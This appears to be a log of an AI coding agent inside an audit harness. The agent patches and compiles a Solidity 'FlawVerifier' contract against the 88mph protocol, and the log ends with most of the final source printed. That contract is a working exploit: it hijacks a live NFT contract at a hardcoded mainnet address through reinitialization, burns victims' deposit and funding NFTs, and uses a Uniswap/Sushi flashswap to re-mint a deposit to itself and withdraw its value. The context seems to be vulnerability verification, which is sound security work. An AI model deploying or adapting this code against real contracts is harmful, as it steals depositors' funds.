+new = \"\"\"    function uniswapV2Call(address sender, uint256, uint256, bytes calldata) external {\\n        require(msg.sender == _expectedFlashPair, \\\"unexpected pair\\\");\\n        require(sender == address(this), \\\"unexpected sender\\\");\\n\\n        address[] memory path = new address[](_flashPathLength);\\n        if (_flashPathLength > 0) path[0] = _flashPath0;\\n        if (_flashPathLength > 1) path[1] = _flashPath1;\\n        if (_flashPathLength > 2) path[2] = _flashPath2;\\n\\n        if (_flashMPHNeeded > 0) {\\n            _approveToken(_flashStablecoin, _flashRouter, _flashBorrowedStable);\\n            IUniswapV2RouterLike(_flashRouter).swapTokensForExactTokens(\\n                _flashMPHNeeded,\\n                _flashBorrowedStable,\\n                path,\\n                address(this),\\n                block.timestamp\\n            );\\n            _approveToken(_flashMPH, _flashMPHMinter, _flashMPHNeeded);\\n        }\\n\\n        INFTLike depositNft = INFTLike(_flashDepositNFT);\\n        depositNft.burn(_flashDepositID);\\n        depositNft.mint(address(this), _flashDepositID);\\n\\n        if (_flashUseEarly) {\\n            IDInterestLike(pool).earlyWithdraw(_flashDepositID, _flashFundingID);\\n        } else {\\n            IDInterestLike(pool).withdraw(_flashDepositID, _flashFundingID);\\n        }\\n\\n        uint256 repayment = _sameTokenFlashRepayment(_flashBorrowedStable);\\n        _safeTransfer(_flashStablecoin, msg.sender, repayment);\\n        _clearFlashContext();\\n        _profitAmount = IERC20Like(_profitToken).balanceOf(address(this));\\n    }\\n\"\"\"
+s = s.replace(old, new)
+old = \"\"\"        uint256 borrowedStable = (stableNeeded * 101) / 100 + 1;\\n        _expectedFlashPair = flashPair;\\n\\n        IUniswapV2PairLike pair = IUniswapV2PairLike(flashPair);\\n        bytes memory callbackData = abi.encode(\\n            _profitToken,\\n            mph,\\n            router,\\n            path,\\n            depositNftAddr,\\n            mphMinter,\\n            depositID,\\n            fundingID,\\n            useEarly,\\n            mphNeeded,\\n            borrowedStable\\n        );\\n\\n        if (pair.token0() == _profitToken) {\\n            pair.swap(borrowedStable, 0, address(this), callbackData);\\n        } else if (pair.token1() == _profitToken) {\\n            pair.swap(0, borrowedStable, address(this), callbackData);\\n        } else {\\n            _expectedFlashPair = address(0);\\n        }\\n\"\"\"
+new = \"\"\"        uint256 borrowedStable = (stableNeeded * 101) / 100 + 1;\\n        _setFlashContext(\\n            flashPair,\\n            _profitToken,\\n            mph,\\n            router,\\n            depositNftAddr,\\n            mphMinter,\\n            depositID,\\n            fundingID,\\n            useEarly,\\n            mphNeeded,\\n            borrowedStable,\\n            path\\n        );\\n\\n        IUniswapV2PairLike pair = IUniswapV2PairLike(flashPair);\\n        if (pair.token0() == _profitToken) {\\n            pair.swap(borrowedStable, 0, address(this), hex\\\"01\\\");\\n        } else if (pair.token1() == _profitToken) {\\n            pair.swap(0, borrowedStable, address(this), hex\\\"01\\\");\\n        } else {\\n            _clearFlashContext();\\n        }\\n\"\"\"
+s = s.replace(old, new)
+insert_after = \"\"\"    function _sameTokenFlashRepayment(uint256 borrowedAmount) internal pure returns (uint256) {\\n        return (borrowedAmount * 1000) / 997 + 1;\\n    }\\n\\n\"\"\"
+addition = \"\"\"    function _setFlashContext(\\n        address flashPair,\\n        address stablecoin,\\n        address mph,\\n        address router,\\n        address depositNftAddr,\\n        address mphMinter,\\n        uint256 depositID,\\n        uint256 fundingID,\\n        bool useEarly,\\n        uint256 mphNeeded,\\n        uint256 borrowedStable,\\n        address[] memory path\\n    ) internal {\\n        _expectedFlashPair = flashPair;\\n        _flashStablecoin = stablecoin;\\n        _flashMPH = mph;\\n        _flashRouter = router;\\n        _flashDepositNFT = depositNftAddr;\\n        _flashMPHMinter = mphMinter;\\n        _flashDepositID = depositID;\\n        _flashFundingID = fundingID;\\n        _flashUseEarly = useEarly;\\n        _flashMPHNeeded = mphNeeded;\\n        _flashBorrowedStable = borrowedStable;\\n        _flashPathLength = path.length;\\n        _flashPath0 = path.length > 0 ? path[0] : address(0);\\n        _flashPath1 = path.length > 1 ? path[1] : address(0);\\n        _flashPath2 = path.length > 2 ? path[2] : address(0);\\n    }\\n\\n    function _clearFlashContext() internal {\\n        _expectedFlashPair = address(0);\\n        _flashStablecoin = address(0);\\n        _flashMPH = address(0);\\n        _flashRouter = address(0);\\n        _flashDepositNFT = address(0);\\n        _flashMPHMinter = address(0);\\n        _flashDepositID = 0;\\n        _flashFundingID = 0;\\n        _flashUseEarly = false;\\n        _flashMPHNeeded = 0;\\n        _flashBorrowedStable = 0;\\n        _flashPathLength = 0;\\n        _flashPath0 = address(0);\\n        _flashPath1 = address(0);\\n        _flashPath2 = address(0);\\n    }\\n\\n\"\"\"
+s = s.replace(insert_after, insert_after + addition)
+p.write_text(s)
+PY" in /Users/zhanglongqin/AuditHoundV2/cases/88mph/src succeeded in 223ms:
+
+exec
+/bin/bash -lc 'forge build --root /Users/zhanglongqin/AuditHoundV2/cases/88mph/src' in /Users/zhanglongqin/AuditHoundV2/cases/88mph/src exited 1 in 281ms:
+Compiling 1 files with Solc 0.8.30
+Solc 0.8.30 finished in 99.50ms
+Error: Compiler run failed:
+Error: Compiler error (/solidity/libsolidity/codegen/LValue.cpp:54): Stack too deep. Try compiling with `--via-ir` (cli) or the equivalent `viaIR: true` (standard JSON) while enabling the optimizer. Otherwise, try removing local variables.
+   --> src/FlawVerifier.sol:347:13:
+    |
+347 |             depositNftAddr,
+    |             ^^^^^^^^^^^^^^
+exec
+/bin/bash -lc "nl -ba /Users/zhanglongqin/AuditHoundV2/cases/88mph/src/src/FlawVerifier.sol | sed -n '300,360p'" in /Users/zhanglongqin/AuditHoundV2/cases/88mph/src succeeded in 56ms:
+   300	        }
+   301	
+   302	        (uint256 depositID, uint256 fundingID, bool useEarly, uint256 mphNeeded) = _findProfitDepositCandidate(
+   303	            market,
+   304	            depositNft,
+   305	            hijackedTokenId
+   306	        );
+   307	        if (depositID == 0) {
+   308	            return;
+   309	        }
+   310	
+   311	        address mphMinter = market.mphMinter();
+   312	        address mph = IMPHMinterLike(mphMinter).mph();
+   313	
+   314	        if (mphNeeded == 0) {
+   315	            depositNft.burn(depositID);
+   316	            depositNft.mint(address(this), depositID);
+   317	            if (useEarly) {
+   318	                market.earlyWithdraw(depositID, fundingID);
+   319	            } else {
+codex
+I’m splitting the flashswap launcher into a helper to drop locals.
+exec
+/bin/bash -lc "python - <<'PY'
+from pathlib import Path
+p = Path('/Users/zhanglongqin/AuditHoundV2/cases/88mph/src/src/FlawVerifier.sol')
+s = p.read_text()
+old = '''        (address flashPair, address router, address[] memory path) = _locateFlashswapPlan(_profitToken, mph);
+        if (flashPair == address(0) || router == address(0) || path.length < 2) {
+            return;
+        }
+
+        uint256 stableNeeded;
+        try IUniswapV2RouterLike(router).getAmountsIn(mphNeeded, path) returns (uint256[] memory amountsIn) {
+            stableNeeded = amountsIn[0];
+        } catch {
+            return;
+        }
+        if (stableNeeded == 0) {
+            return;
+        }
+
+        uint256 borrowedStable = (stableNeeded * 101) / 100 + 1;
+        _setFlashContext(
+            flashPair,
+            _profitToken,
+            mph,
+            router,
+            depositNftAddr,
+            mphMinter,
+            depositID,
+            fundingID,
+            useEarly,
+            mphNeeded,
+            borrowedStable,
+            path
+        );
+
+        IUniswapV2PairLike pair = IUniswapV2PairLike(flashPair);
+        if (pair.token0() == _profitToken) {
+            pair.swap(borrowedStable, 0, address(this), hex\"01\");
+        } else if (pair.token1() == _profitToken) {
+            pair.swap(0, borrowedStable, address(this), hex\"01\");
+        } else {
+            _clearFlashContext();
+        }
+'''
+new = '''        _launchFlashswapDepositTheft(
+            depositNftAddr,
+            mphMinter,
+            mph,
+            depositID,
+            fundingID,
+            useEarly,
+            mphNeeded
+        );
+'''
+s = s.replace(old, new)
+insert_after = '''    function _attemptFundingInterestTheft(IDInterestLike market, address fundingNftAddr) internal {
+'''
+addition = '''    function _launchFlashswapDepositTheft(
+        address depositNftAddr,
+        address mphMinter,
+        address mph,
+        uint256 depositID,
+        uint256 fundingID,
+        bool useEarly,
+        uint256 mphNeeded
+    ) internal {
+        (address flashPair, address router, address[] memory path) = _locateFlashswapPlan(_profitToken, mph);
+        if (flashPair == address(0) || router == address(0) || path.length < 2) {
+            return;
+        }
+
+        uint256 stableNeeded;
+        try IUniswapV2RouterLike(router).getAmountsIn(mphNeeded, path) returns (uint256[] memory amountsIn) {
+            stableNeeded = amountsIn[0];
+        } catch {
+            return;
+        }
+        if (stableNeeded == 0) {
+            return;
+        }
+
+        uint256 borrowedStable = (stableNeeded * 101) / 100 + 1;
+        _setFlashContext(
+            flashPair,
+            _profitToken,
+            mph,
+            router,
+            depositNftAddr,
+            mphMinter,
+            depositID,
+            fundingID,
+            useEarly,
+            mphNeeded,
+            borrowedStable,
+            path
+        );
+
+        IUniswapV2PairLike pair = IUniswapV2PairLike(flashPair);
+        if (pair.token0() == _profitToken) {
+            pair.swap(borrowedStable, 0, address(this), hex\"01\");
+        } else if (pair.token1() == _profitToken) {
+            pair.swap(0, borrowedStable, address(this), hex\"01\");
+        } else {
+            _clearFlashContext();
+        }
+    }
+
+'''
+s = s.replace(insert_after, addition + insert_after)
+p.write_text(s)
+PY" in /Users/zhanglongqin/AuditHoundV2/cases/88mph/src succeeded in 1.13s:
+
+exec
+/bin/bash -lc 'forge build --root /Users/zhanglongqin/AuditHoundV2/cases/88mph/src' in /Users/zhanglongqin/AuditHoundV2/cases/88mph/src exited 1 in 2.36s:
+Compiling 1 files with Solc 0.8.30
+Solc 0.8.30 finished in 604.66ms
+Error: Compiler run failed:
+Error: Compiler error (/solidity/libsolidity/codegen/LValue.cpp:54): Stack too deep. Try compiling with `--via-ir` (cli) or the equivalent `viaIR: true` (standard JSON) while enabling the optimizer. Otherwise, try removing local variables.
+   --> src/FlawVerifier.sol:367:13:
+    |
+367 |             depositNftAddr,
+    |             ^^^^^^^^^^^^^^
+exec
+/bin/bash -lc "nl -ba /Users/zhanglongqin/AuditHoundV2/cases/88mph/src/src/FlawVerifier.sol | sed -n '345,380p'" in /Users/zhanglongqin/AuditHoundV2/cases/88mph/src succeeded in 52ms:
+   345	    ) internal {
+   346	        (address flashPair, address router, address[] memory path) = _locateFlashswapPlan(_profitToken, mph);
+   347	        if (flashPair == address(0) || router == address(0) || path.length < 2) {
+   348	            return;
+   349	        }
+   350	
+   351	        uint256 stableNeeded;
+   352	        try IUniswapV2RouterLike(router).getAmountsIn(mphNeeded, path) returns (uint256[] memory amountsIn) {
+   353	            stableNeeded = amountsIn[0];
+   354	        } catch {
+   355	            return;
+   356	        }
+   357	        if (stableNeeded == 0) {
+   358	            return;
+   359	        }
+   360	
+   361	        uint256 borrowedStable = (stableNeeded * 101) / 100 + 1;
+   362	        _setFlashContext(
+   363	            flashPair,
+   364	            _profitToken,
+codex
+I’m inlining flash context writes to kill the remaining stack pressure.
+exec
+/bin/bash -lc "python - <<'PY'
+from pathlib import Path
+p = Path('/Users/zhanglongqin/AuditHoundV2/cases/88mph/src/src/FlawVerifier.sol')
+s = p.read_text()
+old = '''        uint256 borrowedStable = (stableNeeded * 101) / 100 + 1;
+        _setFlashContext(
+            flashPair,
+            _profitToken,
+            mph,
+            router,
+            depositNftAddr,
+            mphMinter,
+            depositID,
+            fundingID,
+            useEarly,
+            mphNeeded,
+            borrowedStable,
+            path
+        );
+'''
+new = '''        uint256 borrowedStable = (stableNeeded * 101) / 100 + 1;
+        _expectedFlashPair = flashPair;
+        _flashStablecoin = _profitToken;
+        _flashMPH = mph;
+        _flashRouter = router;
+        _flashDepositNFT = depositNftAddr;
+        _flashMPHMinter = mphMinter;
+        _flashDepositID = depositID;
+        _flashFundingID = fundingID;
+        _flashUseEarly = useEarly;
+        _flashMPHNeeded = mphNeeded;
+        _flashBorrowedStable = borrowedStable;
+        _flashPathLength = path.length;
+        _flashPath0 = path.length > 0 ? path[0] : address(0);
+        _flashPath1 = path.length > 1 ? path[1] : address(0);
+        _flashPath2 = path.length > 2 ? path[2] : address(0);
+'''
+s = s.replace(old, new)
+# remove _setFlashContext function block
+import re
+s = re.sub(r'\\n\\s*function _setFlashContext\\([\\s\\S]*?\\n\\s*function _clearFlashContext\\(', '\\n    function _clearFlashContext(', s, count=1)
+p.write_text(s)
+PY" in /Users/zhanglongqin/AuditHoundV2/cases/88mph/src succeeded in 340ms:
+
+exec
+/bin/bash -lc 'forge build --root /Users/zhanglongqin/AuditHoundV2/cases/88mph/src' in /Users/zhanglongqin/AuditHoundV2/cases/88mph/src succeeded in 4.54s:
+Compiling 1 files with Solc 0.8.30
+Solc 0.8.30 finished in 931.74ms
+Compiler run successful!
+note[mixed-case-variable]: mutable variables should use mixedCase
+  --> src/FlawVerifier.sol:26:17
+   |
+26 |         uint256 mintMPHAmount;
+   |                 ^^^^^^^^^^^^^ help: consider using: `mintMphAmount`
+   |
+   = help: https://book.getfoundry.sh/reference/forge/forge-lint#mixed-case-variable
+
+note[mixed-case-variable]: mutable variables should use mixedCase
+  --> src/FlawVerifier.sol:31:17
+   |
+31 |         uint256 fromDepositID;
+   |                 ^^^^^^^^^^^^^ help: consider using: `fromDepositId`
+   |
+   = help: https://book.getfoundry.sh/reference/forge/forge-lint#mixed-case-variable
+
+note[mixed-case-variable]: mutable variables should use mixedCase
+Plan update
+  ✓ Inspect harness expectations
+  ✓ Design profitable causal path
+  ✓ Patch FlawVerifier.sol
+  ✓ Sanity-check compile logic
+codex
+Build passes locally, and I’m grabbing the final Solidity exactly as written.
+exec
+/bin/bash -lc 'cat /Users/zhanglongqin/AuditHoundV2/cases/88mph/src/src/FlawVerifier.sol' in /Users/zhanglongqin/AuditHoundV2/cases/88mph/src succeeded in 51ms:
+pragma solidity ^0.8.20;
+
+interface IERC20Like {
+    function balanceOf(address account) external view returns (uint256);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function transfer(address to, uint256 amount) external returns (bool);
+}
+
+interface INFTLike {
+    function owner() external view returns (address);
+    function init(address newOwner, string calldata tokenName, string calldata tokenSymbol) external;
+    function ownerOf(uint256 tokenId) external view returns (address);
+    function burn(uint256 tokenId) external;
+    function mint(address to, uint256 tokenId) external;
+}
+
+interface IDInterestLike {
+    struct Deposit {
+        uint256 amount;
+        uint256 maturationTimestamp;
+exec
+/bin/bash -lc "nl -ba /Users/zhanglongqin/AuditHoundV2/cases/88mph/src/src/FlawVerifier.sol | sed -n '1,260p' && printf '\\n---SPLIT---\\n' && nl -ba /Users/zhanglongqin/AuditHoundV2/cases/88mph/src/src/FlawVerifier.sol | sed -n '261,520p' && printf '\\n---SPLIT---\\n' && nl -ba /Users/zhanglongqin/AuditHoundV2/cases/88mph/src/src/FlawVerifier.sol | sed -n '521,760p'" in /Users/zhanglongqin/AuditHoundV2/cases/88mph/src succeeded in 50ms:
+     1	pragma solidity ^0.8.20;
+     2	
+     3	interface IERC20Like {
+     4	    function balanceOf(address account) external view returns (uint256);
+     5	    function approve(address spender, uint256 amount) external returns (bool);
+     6	    function transfer(address to, uint256 amount) external returns (bool);
+     7	}
+     8	
+     9	interface INFTLike {
+    10	    function owner() external view returns (address);
+    11	    function init(address newOwner, string calldata tokenName, string calldata tokenSymbol) external;
+    12	    function ownerOf(uint256 tokenId) external view returns (address);
+    13	    function burn(uint256 tokenId) external;
+    14	    function mint(address to, uint256 tokenId) external;
+    15	}
+    16	
+    17	interface IDInterestLike {
+    18	    struct Deposit {
+    19	        uint256 amount;
+    20	        uint256 maturationTimestamp;
+exec
+/bin/bash -lc "sed -n '1,230p' /Users/zhanglongqin/AuditHoundV2/cases/88mph/src/src/FlawVerifier.sol" in /Users/zhanglongqin/AuditHoundV2/cases/88mph/src succeeded in 51ms:
+pragma solidity ^0.8.20;
+
+interface IERC20Like {
+    function balanceOf(address account) external view returns (uint256);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function transfer(address to, uint256 amount) external returns (bool);
+}
+
+interface INFTLike {
+    function owner() external view returns (address);
+    function init(address newOwner, string calldata tokenName, string calldata tokenSymbol) external;
+    function ownerOf(uint256 tokenId) external view returns (address);
+    function burn(uint256 tokenId) external;
+    function mint(address to, uint256 tokenId) external;
+}
+
+interface IDInterestLike {
+    struct Deposit {
+        uint256 amount;
+        uint256 maturationTimestamp;
+exec
+/bin/bash -lc "sed -n '231,460p' /Users/zhanglongqin/AuditHoundV2/cases/88mph/src/src/FlawVerifier.sol" in /Users/zhanglongqin/AuditHoundV2/cases/88mph/src succeeded in 51ms:
+        return _profitAmount;
+    }
+
+    function _demonstrateDepositDoS(IDInterestLike market, INFTLike depositNft) internal {
+        (uint256 depositID, uint256 fundingID, bool useEarly) = _findDepositDoSCandidate(market, depositNft, 0);
+        if (depositID == 0) {
+            failureReason = "no burnable deposit NFT candidate found";
+            return;
+        }
+
+        hijackedTokenId = depositID;
+        linkedFundingId = fundingID;
+        usedEarlyWithdraw = useEarly;
+        victimOwnerBeforeBurn = depositNft.ownerOf(depositID);
+
+        // Step 2 from the finding: burn a live victim deposit NFT after seizing ownership.
+        depositNft.burn(depositID);
+        burnedVictimToken = true;
+
+        // Step 3 from the finding: ownerOf() no longer returns a valid holder.
+exec
+/bin/bash -lc "sed -n '461,760p' /Users/zhanglongqin/AuditHoundV2/cases/88mph/src/src/FlawVerifier.sol" in /Users/zhanglongqin/AuditHoundV2/cases/88mph/src succeeded in 51ms:
+
+            uint256 linked = 0;
+            if (market.depositIsFunded(i)) {
+                // Prefer simpler unfunded positions to keep the execution route deterministic.
+                continue;
+            }
+
+            if (
+                deposit.mintMPHAmount < bestMPH ||
+                (deposit.mintMPHAmount == bestMPH && deposit.amount > bestAmount)
+            ) {
+                bestAmount = deposit.amount;
+                bestMPH = deposit.mintMPHAmount;
+                depositID = i;
+                fundingID = linked;
+                useEarly = true;
+                mphNeeded = deposit.mintMPHAmount;
+            }
+        }
+    }
+exec
+/bin/bash -lc "sed -n '220,240p' /Users/zhanglongqin/AuditHoundV2/cases/88mph/src/src/FlawVerifier.sol" in /Users/zhanglongqin/AuditHoundV2/cases/88mph/src succeeded in 51ms:
+        uint256 repayment = _sameTokenFlashRepayment(_flashBorrowedStable);
+        _safeTransfer(_flashStablecoin, msg.sender, repayment);
+        _clearFlashContext();
+        _profitAmount = IERC20Like(_profitToken).balanceOf(address(this));
+    }
+
+    function profitToken() external view returns (address) {
+        return _profitToken;
+    }
+
+    function profitAmount() external view returns (uint256) {
+        return _profitAmount;
+    }
+
+    function _demonstrateDepositDoS(IDInterestLike market, INFTLike depositNft) internal {
+        (uint256 depositID, uint256 fundingID, bool useEarly) = _findDepositDoSCandidate(market, depositNft, 0);
+        if (depositID == 0) {
+            failureReason = "no burnable deposit NFT candidate found";
+            return;
+        }
+codex
+pragma solidity ^0.8.20;
+
+interface IERC20Like {
+    function balanceOf(address account) external view returns (uint256);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function transfer(address to, uint256 amount) external returns (bool);
+}
+
+interface INFTLike {
+    function owner() external view returns (address);
+    function init(address newOwner, string calldata tokenName, string calldata tokenSymbol) external;
+    function ownerOf(uint256 tokenId) external view returns (address);
+    function burn(uint256 tokenId) external;
+    function mint(address to, uint256 tokenId) external;
+}
+
+interface IDInterestLike {
+    struct Deposit {
+        uint256 amount;
+        uint256 maturationTimestamp;
+        uint256 interestOwed;
+        uint256 initialMoneyMarketIncomeIndex;
+        bool active;
+        bool finalSurplusIsNegative;
+        uint256 finalSurplusAmount;
+        uint256 mintMPHAmount;
+        uint256 depositTimestamp;
+    }
+
+    struct Funding {
+        uint256 fromDepositID;
+        uint256 toDepositID;
+        uint256 recordedFundedDepositAmount;
+        uint256 recordedMoneyMarketIncomeIndex;
+        uint256 creationTimestamp;
+    }
+
+    function depositNFT() external view returns (address);
+    function fundingNFT() external view returns (address);
+    function stablecoin() external view returns (address);
+    function moneyMarket() external view returns (address);
+    function mphMinter() external view returns (address);
+    function depositsLength() external view returns (uint256);
+    function fundingListLength() external view returns (uint256);
+    function getDeposit(uint256 depositID) external view returns (Deposit memory);
+    function getFunding(uint256 fundingID) external view returns (Funding memory);
+    function depositIsFunded(uint256 depositID) external view returns (bool);
+    function withdraw(uint256 depositID, uint256 fundingID) external;
+    function earlyWithdraw(uint256 depositID, uint256 fundingID) external;
+    function payInterestToFunder(uint256 fundingID) external returns (uint256 interestAmount);
+}
+
+interface IMoneyMarketLike {
+    function incomeIndex() external view returns (uint256);
+}
+
+interface IMPHMinterLike {
+    function mph() external view returns (address);
+}
+
+interface IUniswapV2FactoryLike {
+    function getPair(address tokenA, address tokenB) external view returns (address pair);
+}
+
+interface IUniswapV2PairLike {
+    function token0() external view returns (address);
+    function token1() external view returns (address);
+    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
+}
+
+interface IUniswapV2RouterLike {
+    function getAmountsIn(uint256 amountOut, address[] calldata path) external view returns (uint256[] memory amounts);
+    function swapTokensForExactTokens(
+        uint256 amountOut,
+        uint256 amountInMax,
+        address[] calldata path,
+        address to,
+        uint256 deadline
+    ) external returns (uint256[] memory amounts);
+}
+
+contract FlawVerifier {
+    address public constant TARGET = 0xF0b7DE03134857391d8D43Ed48e20EDF21461097;
+
+    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
+    address private constant UNI_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
+    address private constant UNI_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
+    address private constant SUSHI_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
+    address private constant SUSHI_ROUTER = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;
+
+    address private _profitToken;
+    uint256 private _profitAmount;
+
+    address public pool;
+    uint256 public hijackedTokenId;
+    uint256 public linkedFundingId;
+    bool public targetIsDepositNFT;
+    bool public targetIsFundingNFT;
+    bool public hypothesisValidated;
+    bool public burnedVictimToken;
+    bool public ownerQueryRevertedAfterBurn;
+    bool public demonstratedPathRevert;
+    bool public usedEarlyWithdraw;
+    address public victimOwnerBeforeBurn;
+    string public exploitPath;
+    string public failureReason;
+
+    address private _expectedFlashPair;
+    address private _flashStablecoin;
+    address private _flashMPH;
+    address private _flashRouter;
+    address private _flashDepositNFT;
+    address private _flashMPHMinter;
+    uint256 private _flashDepositID;
+    uint256 private _flashFundingID;
+    bool private _flashUseEarly;
+    uint256 private _flashMPHNeeded;
+    uint256 private _flashBorrowedStable;
+    uint256 private _flashPathLength;
+    address private _flashPath0;
+    address private _flashPath1;
+    address private _flashPath2;
+
+    constructor() {}
+
+    function executeOnOpportunity() public {
+        if (hypothesisValidated || bytes(failureReason).length != 0) {
+            return;
+        }
+
+        INFTLike targetNft = INFTLike(TARGET);
+        pool = targetNft.owner();
+        if (pool == address(0)) {
+            failureReason = "target owner is zero";
+            return;
+        }
+
+        IDInterestLike market = IDInterestLike(pool);
+        address depositNftAddr = market.depositNFT();
+        address fundingNftAddr = market.fundingNFT();
+        _profitToken = market.stablecoin();
+        _profitAmount = 0;
+
+        targetIsDepositNFT = depositNftAddr == TARGET;
+        targetIsFundingNFT = fundingNftAddr == TARGET;
+        if (!targetIsDepositNFT && !targetIsFundingNFT) {
+            failureReason = "target NFT not wired into pool";
+            return;
+        }
+
+        // Step 1 from the finding: reinitialize the live NFT clone and seize ownership.
+        targetNft.init(address(this), "hijacked", "HIJACKED");
+        if (targetNft.owner() != address(this)) {
+            failureReason = "reinitialization failed";
+            return;
+        }
+        hypothesisValidated = true;
+
+        if (targetIsDepositNFT) {
+            exploitPath =
+                "init(target depositNFT) -> burn(victim deposit NFT) -> ownerOf(tokenId) reverts -> victim withdraw path reverts; then reuse seized owner-only burn/mint with flashswap-sourced MPH to remint another live deposit NFT and steal its withdrawal value";
+            _demonstrateDepositDoS(market, INFTLike(depositNftAddr));
+        } else {
+            exploitPath =
+                "init(target fundingNFT) -> burn(victim funding NFT) -> ownerOf(tokenId) reverts -> funder payout path reverts; then seize deposit/funding NFT owner-only burn/mint powers to realize profit";
+            _demonstrateFundingDoS(market, INFTLike(fundingNftAddr));
+        }
+
+        if (bytes(failureReason).length != 0) {
+            return;
+        }
+
+        // Economic realization:
+        // Prefer a UniswapV2/Sushi-like flashswap only when the stolen deposit's withdrawal
+        // requires sourcing MPH for the pool's reward clawback. This does not change the root
+        // cause: the theft still comes from unrestricted NFT reinitialization giving live
+        // owner-only burn/mint powers over the pool's deposit/funding NFTs.
+        if (_profitAmount == 0) {
+            _attemptDepositTheft(market, depositNftAddr);
+        }
+        if (_profitAmount == 0) {
+            _attemptFundingInterestTheft(market, fundingNftAddr);
+        }
+        if (_profitAmount == 0 && bytes(failureReason).length == 0) {
+            failureReason = "exploit demonstrated but no profit path realized";
+        }
+    }
+
+    function uniswapV2Call(address sender, uint256, uint256, bytes calldata) external {
+        require(msg.sender == _expectedFlashPair, "unexpected pair");
+        require(sender == address(this), "unexpected sender");
+
+        address[] memory path = new address[](_flashPathLength);
+        if (_flashPathLength > 0) path[0] = _flashPath0;
+        if (_flashPathLength > 1) path[1] = _flashPath1;
+        if (_flashPathLength > 2) path[2] = _flashPath2;
+
+        if (_flashMPHNeeded > 0) {
+            _approveToken(_flashStablecoin, _flashRouter, _flashBorrowedStable);
+            IUniswapV2RouterLike(_flashRouter).swapTokensForExactTokens(
+                _flashMPHNeeded,
+                _flashBorrowedStable,
+                path,
+                address(this),
+                block.timestamp
+            );
+            _approveToken(_flashMPH, _flashMPHMinter, _flashMPHNeeded);
+        }
+
+        INFTLike depositNft = INFTLike(_flashDepositNFT);
+        depositNft.burn(_flashDepositID);
+        depositNft.mint(address(this), _flashDepositID);
+
+        if (_flashUseEarly) {
+            IDInterestLike(pool).earlyWithdraw(_flashDepositID, _flashFundingID);
+        } else {
+            IDInterestLike(pool).withdraw(_flashDepositID, _flashFundingID);
+        }
+
+        uint256 repayment = _sameTokenFlashRepayment(_flashBorrowedStable);
+        _safeTransfer(_flashStablecoin, msg.sender, repayment);
+        _clearFlashContext();
+        _profitAmount = IERC20Like(_profitToken).balanceOf(address(this));
+    }
+
+    function profitToken() external view returns (address) {
+        return _profitToken;
+    }
+
+    function profitAmount() external view returns (uint256) {
+        return _profitAmount;
+    }
+
+    function _demonstrateDepositDoS(IDInterestLike market, INFTLike depositNft) internal {
+        (uint256 depositID, uint256 fundingID, bool useEarly) = _findDepositDoSCandidate(market, depositNft, 0);
+        if (depositID == 0) {
+            failureReason = "no burnable deposit NFT candidate found";
+            return;
+        }
+
+        hijackedTokenId = depositID;
+        linkedFundingId = fundingID;
+        usedEarlyWithdraw = useEarly;
+        victimOwnerBeforeBurn = depositNft.ownerOf(depositID);
+
+        // Step 2 from the finding: burn a live victim deposit NFT after seizing ownership.
+        depositNft.burn(depositID);
+        burnedVictimToken = true;
+
+        // Step 3 from the finding: ownerOf() no longer returns a valid holder.
+        ownerQueryRevertedAfterBurn = _ownerQueryReverts(depositNft, depositID);
+
+        (bool reverted, ) = useEarly
+            ? _callEarlyWithdraw(address(market), depositID, fundingID)
+            : _callWithdraw(address(market), depositID, fundingID);
+        demonstratedPathRevert = reverted;
+
+        if (!ownerQueryRevertedAfterBurn) {
+            failureReason = "burn succeeded but ownerOf still resolves";
+        } else if (!demonstratedPathRevert) {
+            failureReason = "burned deposit NFT but withdraw path did not revert";
+        }
+    }
+
+    function _demonstrateFundingDoS(IDInterestLike market, INFTLike fundingNft) internal {
+        uint256 fundingID = _findExistingFundingToken(market, fundingNft, 0);
+        if (fundingID == 0) {
+            failureReason = "no burnable funding NFT candidate found";
+            return;
+        }
+
+        hijackedTokenId = fundingID;
+        linkedFundingId = fundingID;
+        victimOwnerBeforeBurn = fundingNft.ownerOf(fundingID);
+
+        // Step 2 from the finding: burn a live victim funding NFT after seizing ownership.
+        fundingNft.burn(fundingID);
+        burnedVictimToken = true;
+
+        // Step 3 from the finding: ownerOf() no longer returns a valid holder.
+        ownerQueryRevertedAfterBurn = _ownerQueryReverts(fundingNft, fundingID);
+
+        (bool reverted, ) = _callPayInterestToFunder(address(market), fundingID);
+        demonstratedPathRevert = reverted;
+
+        if (!ownerQueryRevertedAfterBurn) {
+            failureReason = "burn succeeded but ownerOf still resolves";
+        } else if (!demonstratedPathRevert) {
+            failureReason = "burned funding NFT but payout path did not revert";
+        }
+    }
+
+    function _attemptDepositTheft(IDInterestLike market, address depositNftAddr) internal {
+        INFTLike depositNft = INFTLike(depositNftAddr);
+        if (depositNft.owner() != address(this)) {
+            depositNft.init(address(this), "profit-deposit", "PDEPOSIT");
+            if (depositNft.owner() != address(this)) {
+                return;
+            }
+        }
+
+        (uint256 depositID, uint256 fundingID, bool useEarly, uint256 mphNeeded) = _findProfitDepositCandidate(
+            market,
+            depositNft,
+            hijackedTokenId
+        );
+        if (depositID == 0) {
+            return;
+        }
+
+        address mphMinter = market.mphMinter();
+        address mph = IMPHMinterLike(mphMinter).mph();
+
+        if (mphNeeded == 0) {
+            depositNft.burn(depositID);
+            depositNft.mint(address(this), depositID);
+            if (useEarly) {
+                market.earlyWithdraw(depositID, fundingID);
+            } else {
+                market.withdraw(depositID, fundingID);
+            }
+            _profitAmount = IERC20Like(_profitToken).balanceOf(address(this));
+            return;
+        }
+
+        _launchFlashswapDepositTheft(
+            depositNftAddr,
+            mphMinter,
+            mph,
+            depositID,
+            fundingID,
+            useEarly,
+            mphNeeded
+        );
+    }
+
+    function _launchFlashswapDepositTheft(
+        address depositNftAddr,
+        address mphMinter,
+        address mph,
+        uint256 depositID,
+        uint256 fundingID,
+        bool useEarly,
+        uint256 mphNeeded
+    ) internal {
+        (address flashPair, address router, address[] memory path) = _locateFlashswapPlan(_profitToken, mph);
+        if (flashPair == address(0) || router == address(0) || path.length < 2) {
+            return;
+        }
+
